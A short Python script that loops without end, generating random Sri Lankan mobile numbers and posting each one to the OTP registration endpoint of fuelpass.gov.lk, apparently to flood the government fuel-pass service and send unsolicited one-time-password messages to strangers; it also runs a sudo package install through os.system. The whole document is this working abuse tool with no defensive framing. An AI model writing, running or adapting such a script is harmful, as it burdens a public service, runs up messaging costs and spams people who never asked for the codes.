import requests
from random import randint
import random
import os

os.system("sudo apt-get install python3-requests")
print("requests pip installed")

def concat(default, num):
    num = str(num)
    providerCode = ['5', '7', '6', '1',]
    default = str("07" + random.choice(providerCode))
    return default+num

def random_with_N_digits(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return randint(range_start, range_end)

rowCount = 0;

while(True):
    rowCount += 1;
    randomNum = random_with_N_digits(7)
    url = 'http://fuelpass.gov.lk/api/otp/registration'
    myobj = {'mobileNo': concat(0, randomNum)}
    x = requests.post(url, json = myobj)
    print("a",x)
    print("b",x.text)
    print (rowCount, concat(0, randomNum))
